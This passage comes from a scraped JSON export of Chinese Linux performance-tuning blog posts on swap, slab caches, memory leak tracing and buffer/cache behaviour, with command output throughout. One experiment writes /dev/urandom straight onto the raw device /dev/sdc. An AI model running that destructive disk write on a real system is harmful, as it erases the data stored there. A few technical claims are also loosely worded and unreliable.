kmalloc-1024 1610 1610 100% 0.69K 35 46 1120K sock_inode_cache 1460 1168 0% 0.05K 20 73 80K mbcache 1380 1380 100% 0.09K 30 46 120K trace_event_file 1360 1360 100% 0.02K 8 170 32K lsm_file_cache 1326 1326 100% 0.04K 13 102 52K Acpi-Namespace 1152 1152 100% 0.06K 18 64 72K kmem_cache_node 1134 1134 100% 0.38K 27 42 432K kmem_cache 1024 1024 100% 0.12K 32 32 128K kmalloc-128 928 928 100% 2.00K 58 16 1856K kmalloc-2048 896 896 100% 0.07K 16 56 64K eventpoll_pwq 816 680 0% 0.12K 24 34 96K jbd2_journal_head 782 782 100% 0.69K 17 46 544K files_cache 672 672 100% 1.00K 21 32 672K signal_cache 640 640 100% 0.12K 20 32 80K eventpoll_epi 420 348 0% 5.69K 84 5 2688K task_struct 420 420 100% 0.38K 10 42 160K mnt_cache 390 390 100% 2.06K 26 15 832K sighand_cache 345 345 100% 2.06K 23 15 736K mm_struct 问题以下常用的find 搜索方式会不会影响系统缓存？ 1find &#x2F; -name ls 实验： 12345678root@linux:~# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches ;syncroot@linux:~# find &#x2F; -name ls&#x2F;usr&#x2F;lib&#x2F;klibc&#x2F;bin&#x2F;ls&#x2F;bin&#x2F;ls&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;b720c3b3b6d8c9b5043f2a84687546e5370495209f04cf72d1129b59c6c6de8c&#x2F;diff&#x2F;bin&#x2F;ls&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a8967911e4f5504993174d9beb3212fdd64c173dfa1d01adf96255cb01d5c9f0&#x2F;diff&#x2F;bin&#x2F;ls&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c3560098e9aa20adc9df744ee722dd6b90d8c871dd14b9a68e01f98fcdd9d53a&#x2F;diff&#x2F;bin&#x2F;lsroot@linux:~# 结果slabtop 观察，发现影响 ext4_inode_cache、proc_inode_cache、inode_cache、dentry 1234567891011Active &#x2F; Total Objects (% used) : 335663 &#x2F; 352629 (95.2%)Active &#x2F; Total Slabs (% used) : 7444 &#x2F; 7444 (100.0%)Active &#x2F; Total Caches (% used) : 75 &#x2F; 114 (65.8%)Active &#x2F; Total Size (% used) : 99769.48K &#x2F; 105041.85K (95.0%)Minimum &#x2F; Average &#x2F; Maximum Object : 0.01K &#x2F; 0.30K &#x2F; 8.00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ&#x2F;SLAB CACHE SIZE NAME17220 16731 0% 1.06K 574 30 18368K ext4_inode_cache23424 22928 0% 0.66K 488 48 15616K proc_inode_cache22631 21262 0% 0.59K 427 53 13664K inode_cache69048 61225 0% 0.19K 1644 42 13152K dentry 再次执行 find命令，观察slabtop 发现无任何变化","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 的swap 分区","slug":"Linux-的swap-分区","date":"2019-03-28T09:32:57.000Z","updated":"2021-02-26T06:05:29.256Z","comments":true,"path":"posts/14692.html","link":"","permalink":"https://awen.me/posts/14692.html","excerpt":"Linux 内存测漏会导致内存紧张，从而触发系统直接回收内存和OOM。 OOM 直接杀死进程从而释放内存 内存回收， 大部分文件页都可以直接回收，比如缓存和缓冲区，就属于可回收内存，他们在内存管理中，被叫文件页。","text":"Linux 内存测漏会导致内存紧张，从而触发系统直接回收内存和OOM。 OOM 直接杀死进程从而释放内存 内存回收， 大部分文件页都可以直接回收，比如缓存和缓冲区，就属于可回收内存，他们在内存管理中，被叫文件页。 大部分文件页都可以直接被回收，以后有需要在从磁盘读取，而那些暂时还没写入磁盘的数据(脏页)，就得先写入磁盘，然后在进行释放。 脏页的写入磁盘方式: 通过系统调用 fsync ，把脏页同步到磁盘中； 也可以交给系统，由内核线程 pdflush 负责这些脏页的刷新。 除了缓存和缓冲区，通过内存映射获取的文件映射页，也是一种常见的文件页。它也可以被释放掉，下次再访问的时候，从文件重新读取。 应用程序动态分配的堆内存，也就是匿名页（Anonymous Page）不能被直接回收。但是如果很少被访问，Linux 会将它们暂时存放在磁盘里面，也就是swap中，然后释放内存。 SWAP 原理Swap 就是把一块磁盘空间或者一个本地文件（以下讲解以磁盘为例），当成内存来使用。它包括换出和换入两个过程。 除此之外，还定义了一个进程 kswapd0 来定期回收内存，kswapd0 定义了三个阈值，分别是 页最小阈值（pages_min） 页低阈值（pages_low） 页高阈值（pages_high） 剩余内存，则使用 pages_free 表示。 kswapd0定期扫描内存的使用情况，并根据剩余内存落在这三个阈值的空间位置，进行内存的回收操作。 剩余内存小于页最小阈值，说明进程可用内存都耗尽了，只有内核才可以分配内存。 剩余内存落在页最小阈值和页低阈值中间，说明内存压力比较大，剩余内存不多了。这时kswapd0会执行内存回收，直到剩余内存大于高阈值为止。 剩余内存落在页低阈值和页高阈值中间，说明内存有-定压力，但还可以满足新内存请求。●剩余内存大于页高阈值，说明剩余内存比较多，没有内存压力。 一旦剩余内存小于页低阈值，就会触发内存的回收。这个页低阈值，其实可以通过内核选项 /proc/sys/vm/min_free_kbytes 来间接设置。min_free_kbytes 设置了页最小阈值，而其他两个阈值，都是根据页最小阈值计算生成的，计算方法如下 ： 12pages_low &#x3D; pages_min*5&#x2F;4pages_high &#x3D; pages_min*3&#x2F;2 ##NUMA 和 swap 很多情况下，你明明发现了 Swap 升高，可是在分析系统的内存使用时，却很可能发现，系统剩余内存还多着呢。这有可能是 NUMA 架构导致的。 在 NUMA 架构下，多个处理器被划分到不同 Node 上，且每个 Node 都拥有自己的本地内存空间。而同一个 Node 内部的内存空间，实际上又可以进一步分为不同的内存域（Zone），比如直接内存访问区（DMA）、普通内存区（NORMAL）、伪内存区（MOVABLE）等，如下图所示： 使用 numactl 查看 node 分布 12345678root@linux:~# numactl --hardwareavailable: 1 nodes (0)node 0 cpus: 0 1node 0 size: 7965 MBnode 0 free: 7631 MBnode distances:node 0 0: 10 上面我们发现系统就一个node 也就是node 0， 编号为 0和1，node 0 内存为 7965MB 剩余 7631. 查看阈值 1234567891011121314$ cat &#x2F;proc&#x2F;zoneinfo...Node 0, zone Normal pages free 227894 min 14896 low 18620 high 22344... nr_free_pages 227894 nr_zone_inactive_anon 11082 nr_zone_active_anon 14024 nr_zone_inactive_file 539024 nr_zone_active_file 923986... 说明： pages处的min、low、 high, 就是上面提到的三个内存阈值，而free是剩余内存页数，它跟后面的nr_ free _pages 相同。 nr_ zone active_ anon和nr_ zone_ inactive_ anon, 分别是活跃和非活跃的匿名页数。 nr. zone active_ fhle 和nr_ zone_ inactive_ fle， 分别是活跃和非活跃的文件页数。 从这个输出结果可以发现，剩余内存远大于页高阈值，所以此时的kswapd0不会回收内存。 当然，某个Node内存不足时，系统可以从其他Node寻找空闲内存，也可以从本地内存中回收内存。具体选哪种模式，你可以通过/proc/sys/vm/zone_ reclaim_ mode来调整。它支持以下几个选项: 默认的0，也就是刚刚提到的模式，表示既可以从其他Node寻找空闲内存，也可以从本地回收内存。 1、2、4都表示只回收本地内存，2表示可以回写脏数据回收内存，4表示可以用Swap方式回收内存。 swappiness到这里，我们就可以理解内存回收的机制了。这些回收的内存既包括了文件页，又包括了匿名页。 对文件页的回收，当然就是直接回收缓存，或者把脏页写回磁盘后再回收。 而对匿名页的回收，其实就是通过Swap机制，把它们写入磁盘后再释放内存。 不过，你可能还有一个问题。既然有两种不同的内存回收机制，那么在实际回收内存时，到底该先回收哪一种呢?实，Linux 提供了一个/proc/sys/vm/swappiness选项，用来调整使用Swap的积极程度。 swappiness的范围是0-100,数值越大，越积极使用Swap,也就是更倾向于回收匿名页;数值越小，越消极使用Swap，也就是更倾向于回收文件页。 虽然swappiness的范围是0-100，不过要注意，这并不是内存的百分比，而是调整Swap积极程度的权重，即使你把它设置成0，当剩余内存+文件页小于页高阈值时，还是会发生Swap。 案例 创建交换分区 123456789101112131415root@linux:~# free total used free shared buff&#x2F;cache availableMem: 8156288 230724 6775564 7468 1150000 7665632Swap: 0 0 0root@linux:~# fallocate -l 8G &#x2F;mnt&#x2F;swapfileroot@linux:~# chmod 600 &#x2F;mnt&#x2F;swapfileroot@linux:~# mkswap &#x2F;mnt&#x2F;swapfileSetting up swapspace version 1, size &#x3D; 8 GiB (8589930496 bytes)no label, UUID&#x3D;ceee5c74-7eee-4c46-a354-9468a92d7722root@linux:~# swapon &#x2F;mnt&#x2F;swapfileroot@linux:~# free total used free shared buff&#x2F;cache availableMem: 8156288 157116 7762788 6028 236384 7756172Swap: 8388604 0 8388604root@linux:~# 执行 1root@linux:~# dd if&#x3D;&#x2F;dev&#x2F;vdc of&#x3D;&#x2F;dev&#x2F;null bs&#x3D;1G count&#x3D;2048 执行 sar -r -S 1 123456789101112131415161718192021222324252627282930313233# sar -r -S 1 # -r 表示显示内存使用情况，-S 表示显示swap 使用情况04:48:55 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:48:56 PM 3736788 6692972 4419500 54.19 2967752 196772 1451516 8.77 1188364 3102932 21204:48:55 PM kbswpfree kbswpused %swpused kbswpcad %swpcad04:48:56 PM 8388604 0 0.00 0 0.0004:48:56 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:48:57 PM 3626516 6696040 4529772 55.54 3080392 197252 1434824 8.67 1186304 3215884 38404:48:56 PM kbswpfree kbswpused %swpused kbswpcad %swpcad04:48:57 PM 8388604 0 0.00 0 0.0004:48:57 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:48:58 PM 3514288 6695816 4642000 56.91 3192264 197252 1434824 8.67 1186308 3327760 45204:48:57 PM kbswpfree kbswpused %swpused kbswpcad %swpcad04:48:58 PM 8388604 0 0.00 0 0.0004:48:58 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:48:59 PM 3401440 6695644 4754848 58.30 3304904 197208 1434824 8.67 1186308 3440356 45204:48:58 PM kbswpfree kbswpused %swpused kbswpcad %swpcad04:48:59 PM 8388604 0 0.00 0 0.0004:48:59 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:49:00 PM 3288592 6695628 4867696 59.68 3417552 197252 1434824 8.67 1186364 3553004 5604:48:59 PM kbswpfree kbswpused %swpused kbswpcad %swpcad04:49:00 PM 8388604 0 0.00 0 0.0004:49:00 PM kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty04:49:01 PM 3175620 6695400 4980668 61.07 3530192 197284 1434824 8.67 1186364 3665668 56 参数说明： kbcommit，表示当前系统负载需要的内存。它实际上是为了保证系统内存不溢出，对需要内存的估计值。%commit，就是这个值相对总内存的百分比。 kbactive， 表示活跃内存，也就是最近使用过的内存，一 般不会被系统回收。 kbinact, 表示非活跃内存，也就是不常访问的内存，有可能会被系统回收。 发现总的内存使用率（%memused）在不断增长，从开始的 54% 一直长到了 61%，并且主要内存都被缓冲区（kbbuffers）占用。 刚开始，剩余内存（kbmemfree）不断减少，而缓冲区（kbbuffers）则不断增大，由此可知，剩余内存不断分配给了缓冲区。 一段时间后，剩余内存已经很小，而缓冲区占用了大部分内存。这时候，Swap 的使用开始逐渐增大，缓冲区和剩余内存则只在小范围内波动。 使用cachetop 观察，发现 dd 读写请求只有50% 命中 123456716:52:14 Buffers MB: 5890 &#x2F; Cached MB: 181 &#x2F; Sort: HITS &#x2F; Order: ascendingPID UID CMD HITS MISSES DIRTIES READ_HIT% WRITE_HIT% 1003 syslog rs:main Q:Reg 4 1 1 60.0% 0.0% 1728 root cachetop 6 0 0 100.0% 0.0% 210 root jbd2&#x2F;vda1-8 7 5 5 16.7% 16.7% 272 root systemd-journal 38 29 29 13.4% 0.0% 1670 root dd 141063 140816 0 50.0% 50.0% 执行 watch -d grep -A 15 ‘Normal’ /proc/zoneinfo 观察 123456789101112131415161718Every 2.0s: grep -A 15 Normal &#x2F;proc&#x2F;zoneinfo linux: Thu Mar 28 16:54:34 2019Node 0, zone Normal pages free 17538 min 10560 low 13200 high 15840 spanned 1310720 present 1310720 managed 1269191 protection: (0, 0, 0, 0, 0) nr_free_pages 17538 nr_zone_inactive_anon 20379 nr_zone_active_anon 262562 nr_zone_inactive_file 918902 nr_zone_active_file 18037 nr_zone_unevictable 0 nr_zone_write_pending 44","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何找出内存泄露的程序","slug":"如何找出内存泄露的程序","date":"2019-03-28T07:18:05.000Z","updated":"2021-02-26T06:05:29.327Z","comments":true,"path":"posts/56701.html","link":"","permalink":"https://awen.me/posts/56701.html","excerpt":"使用vmstat 3 每3秒观察一下内存变化可以发现，内存一直在减少，而buff 和cache 没变化，说明内存一直在被消耗。","text":"使用vmstat 3 每3秒观察一下内存变化可以发现，内存一直在减少，而buff 和cache 没变化，说明内存一直在被消耗。 123456789101112131415161718192021222324252627282930313233343536373839root@linux:~# vmstat 3procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 7047444 10788 872936 0 0 264 95 108 98 0 0 99 1 0 0 0 0 7042976 10788 876956 0 0 0 0 1307 1836 3 1 97 0 0 0 0 0 7039280 10796 880596 0 0 0 1941 1536 2961 1 1 97 1 0 …… 0 0 0 6940324 14836 970724 0 0 0 3 157 359 0 0 100 0 0 0 0 0 6940452 14844 970724 0 0 0 235 233 348 0 0 98 2 0 2 0 0 6940452 14844 970724 0 0 0 0 147 335 0 0 100 0 0 0 0 0 6940292 14852 970724 0 0 0 5 142 330 0 0 100 0 0 0 0 0 6940292 14860 970724 0 0 0 4 155 343 0 0 100 0 0 0 0 0 6940292 14860 970724 0 0 0 3 136 317 0 0 100 0 0 0 0 0 6940292 14868 970724 0 0 0 12 144 327 0 0 100 0 0 0 0 0 6940292 14868 970724 0 0 0 15 146 319 0 0 100 0 0 0 0 0 6940324 14876 970728 0 0 0 4 148 335 0 0 100 0 0 0 0 0 6940324 14884 970728 0 0 0 7 169 354 0 0 100 0 0 0 0 0 6940324 14884 970728 0 0 0 0 143 357 0 0 100 0 0 1 0 0 6940200 14892 970728 0 0 0 4 155 339 0 0 100 0 0 0 0 0 6940200 14892 970728 0 0 0 3 157 359 0 0 100 0 0 0 0 0 6940232 14900 970728 0 0 0 7 162 353 0 0 100 0 0 0 0 0 6940232 14908 970728 0 0 0 8 227 456 0 0 99 0 0 0 0 0 6940232 14908 970732 0 0 0 149 254 400 0 0 98 1 0 0 0 0 6940232 14916 970732 0 0 0 9 163 344 0 0 100 0 0procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 6940108 14916 970732 0 0 0 0 140 299 0 0 100 0 0 0 0 0 6940108 14924 970732 0 0 0 8 154 342 0 0 100 0 0 0 0 0 6940016 14932 970732 0 0 0 8 165 354 0 0 99 0 0 0 0 0 6940016 14932 970732 0 0 0 8 138 304 0 0 100 0 0 0 0 0 6940016 14940 970736 0 0 0 4 145 323 0 0 100 0 0 0 0 0 6940016 14940 970736 0 0 0 3 135 328 0 0 100 0 0 0 0 0 6939892 14948 970736 0 0 0 7 151 319 0 0 100 0 0 0 0 0 6939924 14956 970736 0 0 0 7 149 324 0 0 99 0 0 0 0 0 6939924 14956 970736 0 0 0 3 129 302 0 0 100 0 0 0 0 0 6939924 14964 970736 0 0 0 9 150 365 0 0 100 0 0 0 0 0 6939924 14964 970736 0 0 0 89 169 310 0 0 99 1 0 0 0 0 6939800 14972 970736 0 0 0 5 141 329 0 0 99 0 0 0 0 0 6939832 14980 970736 0 0 0 7 141 306 0 0 100 那到底是什么进程在消耗内存资源呢？通过memleak 查看进程的内存分配请求以及地址，可以看到该进程不停的在分配进程。并且这些被分配的进程没有被回收。 12345678910111213141516171819202122232425root@linux:~# memleak -a -p $(pidof app)Attaching to pid 11477, Ctrl+C to quit.[15:22:44] Top 10 stacks with outstanding allocations: addr &#x3D; 7f70e43127b0 size &#x3D; 8192 addr &#x3D; 7f70e430e790 size &#x3D; 8192 addr &#x3D; 7f70e430c780 size &#x3D; 8192 addr &#x3D; 7f70e43107a0 size &#x3D; 8192 32768 bytes in 4 allocations from stack fibonacci+0x1f [app] child+0x4f [app] start_thread+0xdb [libpthread-2.27.so][15:22:49] Top 10 stacks with outstanding allocations: addr &#x3D; 7f70e431a7f0 size &#x3D; 8192 addr &#x3D; 7f70e43147c0 size &#x3D; 8192 addr &#x3D; 7f70e431c800 size &#x3D; 8192 addr &#x3D; 7f70e43127b0 size &#x3D; 8192 addr &#x3D; 7f70e43187e0 size &#x3D; 8192 addr &#x3D; 7f70e430e790 size &#x3D; 8192 addr &#x3D; 7f70e43167d0 size &#x3D; 8192 addr &#x3D; 7f70e430c780 size &#x3D; 8192 addr &#x3D; 7f70e43107a0 size &#x3D; 8192 73728 bytes in 9 allocations from stack fibonacci+0x1f [app] child+0x4f [app] start_thread+0xdb [libpthread-2.27.so] 并且从上图可以看到是 fibonacci() 函数分配内存没有被释放。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何利用系统缓存提高应用程序运行效率","slug":"如何利用系统缓存提高应用程序运行效率","date":"2019-03-28T03:09:44.000Z","updated":"2021-02-26T06:05:29.325Z","comments":true,"path":"posts/36353.html","link":"","permalink":"https://awen.me/posts/36353.html","excerpt":"Buffer和Cache分别缓存的是对磁盘和文件系统的读写数据。 从写的角度来说，不仅可以优化磁盘和文件的写入，对应用程序也有好处，应用程序可以在数据真正落盘前，就返回去做其他工作。 从读的角度来说，不仅可以提高那些频繁访问数据的读取速度，也降低了频繁I/O对磁盘的压力。","text":"Buffer和Cache分别缓存的是对磁盘和文件系统的读写数据。 从写的角度来说，不仅可以优化磁盘和文件的写入，对应用程序也有好处，应用程序可以在数据真正落盘前，就返回去做其他工作。 从读的角度来说，不仅可以提高那些频繁访问数据的读取速度，也降低了频繁I/O对磁盘的压力。 缓存命中率使用cachestat 和 cachetop 查看系统缓存命中情况，这两个工具都是 bcc 软件包的一部分，它们基于 Linux 内核的 eBPF（extended Berkeley Packet Filters）机制，来跟踪内核中管理的缓存，并输出缓存的使用和命中情况。 apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD123echo &quot;deb https:&#x2F;&#x2F;repo.iovisor.org&#x2F;apt&#x2F;xenial xenial main&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;iovisor.listsudo apt-get updatesudo apt-get install -y bcc-tools libbcc-examples linux-headers-$(uname -r) 1$ export PATH&#x3D;$PATH:&#x2F;usr&#x2F;share&#x2F;bcc&#x2F;tools 执行 12345root@linux:~# cachestat 1 3 HITS MISSES DIRTIES HITRATIO BUFFERS_MB CACHED_MB 0 0 0 0.00% 16 2574 0 0 0 0.00% 16 2574 77 1 0 98.72% 16 2574 参数说明: TOTAL，表示总的I/O次数; MISSES，表示缓存未命中的次数; HITS，表示缓存命中的次数; DIRTIES， 表示新增到缓存中的脏页数; BUFFERS_ MB表示Buffers的大小，以MB为单位; CACHED_ _MB表示Cache的大小，以MB为单位。 cachetop 与top 类似，默认按照缓存的命中次数（HITS）排序，展示了每个进程的缓存命中情况。具体到每一个指标，这里的 HITS、MISSES 和 DIRTIES ，跟 cachestat 里的含义一样，分别代表间隔时间内的缓存命中次数、未命中次数以及新增到缓存中的脏页数。而 READ_HIT 和 WRITE_HIT ，分别表示读和写的缓存命中率。 指定文件的缓存大小123456root@linux:~# pcstat &#x2F;bin&#x2F;ls|----------+----------------+------------+-----------+---------|| Name | Size | Pages | Cached | Percent ||----------+----------------+------------+-----------+---------|| &#x2F;bin&#x2F;ls | 133792 | 33 | 33 | 100.000 ||----------+----------------+------------+-----------+---------| 案例生成临时文件 1234root@linux:~# dd if&#x3D;&#x2F;dev&#x2F;sdc of&#x3D;file bs&#x3D;1M count&#x3D;512512+0 records in512+0 records out536870912 bytes (537 MB, 512 MiB) copied, 0.392026 s, 1.4 GB&#x2F;s 使用pcstat 查看文件缓存，并清空换后再次查看确保cached 为 0 12345678910111213root@linux:~# pcstat file|----------+----------------+------------+-----------+---------|| Name | Size | Pages | Cached | Percent ||----------+----------------+------------+-----------+---------|| file | 536870912 | 131072 | 131072 | 100.000 ||----------+----------------+------------+-----------+---------|root@linux:~# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_cachesroot@linux:~# pcstat file|----------+----------------+------------+-----------+---------|| Name | Size | Pages | Cached | Percent ||----------+----------------+------------+-----------+---------|| file | 536870912 | 131072 | 0 | 000.000 ||----------+----------------+------------+-----------+---------| 执行 1234root@linux:~# dd if&#x3D;&#x2F;dev&#x2F;sdc of&#x3D;file bs&#x3D;1M count&#x3D;512512+0 records in512+0 records out536870912 bytes (537 MB, 512 MiB) copied, 5.35013 s, 100 MB&#x2F;s 执行cachetop 5 查看dd 的读写命中都是 25% 执行下面命令 1234oot@linux:~# dd if&#x3D;file of&#x3D;&#x2F;dev&#x2F;null bs&#x3D;1M512+0 records in512+0 records out536870912 bytes (537 MB, 512 MiB) copied, 5.02737 s, 107 MB&#x2F;s 查看缓存 发现只命中 50% 执行下面命令 1234root@linux:~# dd if&#x3D;file of&#x3D;&#x2F;dev&#x2F;null bs&#x3D;1M512+0 records in512+0 records out536870912 bytes (537 MB, 512 MiB) copied, 0.142228 s, 3.8 GB&#x2F;s 可以发现 第二次执行 dd 每秒写速度3.8GB， 第一次是107MB。这就是充分利用了缓存而达到的效果，因此使用dd 进行测试时候需要注意缓存而影响测试效果不准确。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何理解内存的buffer和cache","slug":"如何理解内存的buffer和cache","date":"2019-03-28T01:52:21.000Z","updated":"2021-02-26T06:05:29.329Z","comments":true,"path":"posts/64651.html","link":"","permalink":"https://awen.me/posts/64651.html","excerpt":"当我们执行 free 命令时看到有一栏 buffer/cache","text":"当我们执行 free 命令时看到有一栏 buffer/cache 1234root@linux:~# free -h total used free shared buff&#x2F;cache availableMem: 7.8G 172M 7.0G 6.1M 656M 7.4GSwap: 0B 0B 0B 这里的buffer 和cache 是什么意思呢？我们可以通过 man free 查看解释 12345678910111213141516171819202122DESCRIPTION free displays the total amount of free and used physical and swap memory in the system, as well as the buffers and caches used by the kernel. The information is gathered by parsing &#x2F;proc&#x2F;meminfo. The displayed columns are: total Total installed memory (MemTotal and SwapTotal in &#x2F;proc&#x2F;meminfo) used Used memory (calculated as total - free - buffers - cache) free Unused memory (MemFree and SwapFree in &#x2F;proc&#x2F;meminfo) shared Memory used (mostly) by tmpfs (Shmem in &#x2F;proc&#x2F;meminfo) buffers Memory used by kernel buffers (Buffers in &#x2F;proc&#x2F;meminfo) cache Memory used by the page cache and slabs (Cached and SReclaimable in &#x2F;proc&#x2F;meminfo) buff&#x2F;cache Sum of buffers and cache available Estimation of how much memory is available for starting new applications, without swapping. Unlike the data provided by the cache or free fields, this field takes into account page cache and also that not all reclaimable memory slabs will be reclaimed due to items being in use (MemAvailable in &#x2F;proc&#x2F;meminfo, available on kernels 3.14, emulated on kernels 2.6.27+, otherwise the same as free) 可以看到buff和cache 的数据来源都是来自 /proc/meminfo Buffers 是内核缓冲区用到的内存，对应的是 /proc/meminfo 中的 Buffers 值。 Cache 是内核页缓存和 Slab 用到的内存，对应的是 /proc/meminfo 中的 Cached 与 SReclaimable 之和。 1234root@linux:~# cat &#x2F;proc&#x2F;meminfo | grep SRSReclaimable: 67024 kBroot@linux:~# cat &#x2F;proc&#x2F;meminfo | grep CacCached: 491004 kB 这些数值都来自 /proc/meminfo，但更具体的 Buffers、Cached 和 SReclaimable 的含义，还是没有说清楚。 proc 文件系统执行 man proc 定位到 meninfo 12345678910 Buffers %lu Relatively temporary storage for raw disk blocks that shouldn&#39;t get tremendously large (20MB or so). Cached %lu In-memory cache for files read from the disk (the page cache). Doesn&#39;t include SwapCached. SReclaimable %lu (since Linux 2.6.19) Part of Slab, that might be reclaimed, such as caches.SUnreclaim %lu (since Linux 2.6.19) Part of Slab, that cannot be reclaimed on memory pressure. 通过这个文档，我们可以看到: Buffers 是对原始磁盘块的临时存储，也就是用来缓存磁盘的数据，通常不会特别大(20MB左右)。这样，内核就可以把分散的写集中起来,统-优化磁盘的写入，比如可以把多次小的写合并成单次大的写等等。 Cached是从磁盘读取文件的页缓存，也就是用来缓存从文件读取的数据。这样，下次访问这些文件数据时，就可以直接从内存中快速获取，而不需要再次访问缓慢的磁盘。 SReclaimable 是Slab的一部分。Slab 包括两部分，其中的可回收部分，用SReclaimable记录;而不可回收部分，用SUnreclaim记录。 问题Buffer 的文档没有提到这是磁盘读数据还是写数据的缓存，而在很多网络搜索的结果中都会提到 Buffer 只是对将要写入磁盘数据的缓存。那反过来说，它会不会也缓存从磁盘中读取的数据呢？ Cache 是对从文件读取数据的缓存，那么它是不是也会缓存写文件的数据呢？ 案例分析 清空系统缓存 123456root@linux:~# cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches0root@linux:~# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_cachesroot@linux:~# cat &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches3root@linux:~# 查看wmstat 的buff和cache 12345678910111213141516root@linux:~# vmstat 1procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 7790168 3492 188780 0 0 314 9 120 94 0 0 99 0 0 0 0 0 7790160 3492 188816 0 0 0 0 76 172 0 0 100 0 0 0 0 0 7790160 3492 188816 0 0 0 0 88 222 0 1 100 0 0 0 0 0 7790160 3492 188816 0 0 0 0 83 199 0 0 100 0 0 0 0 0 7790192 3500 188816 0 0 0 24 87 215 0 0 100 1 0 0 0 0 7790192 3500 188816 0 0 0 0 76 174 0 0 100 0 0 0 0 0 7790192 3500 188816 0 0 0 0 77 205 0 0 100 0 0 0 0 0 7790192 3500 188816 0 0 0 0 125 292 0 0 100 0 0 0 0 0 7790192 3500 188816 0 0 0 344 215 198 0 0 97 3 0 0 0 0 7790192 3500 188816 0 0 0 0 64 182 0 0 100 0 0 1 0 0 7790192 3500 188816 0 0 0 0 82 201 0 1 100 0 0 0 0 0 7790192 3500 188816 0 0 0 0 65 153 0 0 100 0 0 0 0 0 7790192 3500 188816 0 0 0 0 58 144 0 0 100 0 0 输出界面里，内存部分的 buff和cache，以及io部分的bi和bo就是我们要关注的重点。 buff和cache就是我们前面看到的Buffers和Cache， 单位是KB。 bi和bo则分别表示块设备读取和写入的大小，单位为块/秒。因为Linux中块的大小是1KB，所以这个单位也就等价于KB/s。 正常情况下，空闲系统中，你应该看到的是，这几个值在多次结果中一直保持不变。 我们执行dd 随机写文件 12345root@linux:~# dd if&#x3D;&#x2F;dev&#x2F;urandom of&#x3D;&#x2F;tmp&#x2F;file bs&#x3D;1M count&#x3D;500500+0 records in500+0 records out524288000 bytes (524 MB, 500 MiB) copied, 2.87644 s, 182 MB&#x2F;sroot@linux:~# 然后观察vmstat 的变化 会发现，在 dd 命令运行时， Cache 在不停地增长，而 Buffer 基本保持不变。 继续执行 12root@linux:~# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_cachesroot@linux:~# dd if&#x3D;&#x2F;dev&#x2F;urandom of&#x3D;&#x2F;dev&#x2F;sdc bs&#x3D;1M count&#x3D;2048 并没有发现cache 不增长 而buff 增长。 与专栏说的不符合","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 的内存是怎么工作的","slug":"Linux-的内存是怎么工作的","date":"2019-03-27T12:59:08.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/6545.html","link":"","permalink":"https://awen.me/posts/6545.html","excerpt":"内存映射Linux 内核给每个进程都提供了一个独立的虚拟地址空间，并且这个地址是连续的，这样进程就可以很方便的访问内存，更确切的说是访问虚拟内存。","text":"内存映射Linux 内核给每个进程都提供了一个独立的虚拟地址空间，并且这个地址是连续的，这样进程就可以很方便的访问内存，更确切的说是访问虚拟内存。 虚拟地址空间的内部又被分为： 内核空间 用户空间 不同字长的处理器，地址空间范围不同，下图是32位和64位系统的虚拟地址空间 34位系统内核占用1g，用户空间占用3g，64位系统内核空间和用户空间占用128T。 进程的用户态和内核态进程进入用户态时，只能访问用户空间内存，只有进入内核态后，才可以访问内核空间地址。虽然每个进程的地址空间都包含了内核空间，但是这些内核空间，其实关联的都是相同的物理内存，这样，进程切换到内核态后，就可以很方便的访问内核空间内存。 并不是所有的虚拟内存都会分配物理内存，只有那些实际使用的虚拟内存才会被分配物理内存，并且分配后的物理内存，是通过内存映射来管理的。 内存映射内存映射试试将虚拟内存地址映射到物理内存地址，为了完成映射，内核为每个进程都维护了一张页表，记录虚拟地址和物理地址的映射关系。 页表页表实际上存储在 CPU 的内存管理单元 MMU 中，这样，正常情况下，处理器就可以直接通过硬件，找出要访问的内存。 当进程访问的虚拟地址在页表中查找不到，系统会产生一个缺页异常，进入内核空间分配物理内存、更新进程页表，最后在返回给用户空间，恢复进程的运行。 TLB 实际上就是 MMU 中页表的告诉缓存。由于进程的虚拟地址 空间是独立的，TLB的访问速度又比MMU 快，所以，通过减少进程的上下文切换，减少TLB的刷新次数，就可以提高TLB 缓存的使用率，进程提高CPU 的内存访问性能。 注意，MMU 